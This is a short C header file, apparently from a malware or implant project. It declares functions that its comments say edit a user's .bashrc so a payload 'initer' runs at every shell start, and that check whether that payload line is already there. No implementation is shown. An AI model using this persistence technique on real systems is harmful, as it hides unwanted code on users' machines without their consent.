#ifndef SETTLE_H
#define SETTLE_H

/*Edits the .bashrc file to launch the initer at each start*/
int create_persistance(void);

/*Searches for the payload execution in .bashrc before doing any other operation, returns 0 if noops, 1 if it does*/
int NeedsMod(void);

#endif